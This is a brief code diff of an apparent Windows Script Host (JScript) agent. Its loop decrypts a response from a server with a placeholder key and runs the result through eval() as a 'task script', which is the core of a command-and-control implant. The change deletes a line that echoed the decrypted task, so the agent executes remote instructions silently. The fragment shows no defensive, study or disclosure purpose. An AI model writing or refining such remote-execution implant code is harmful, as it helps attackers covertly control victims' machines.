@@ -90,7 +90,6 @@ run = function () {
 		if (r[0].length > 0) {
 			// decrypt reponse
 			d = encrypt("~KEY~", r[0]);
-			WScript.Echo(d);
 			// eval task script
 			try {
 				eval(d);
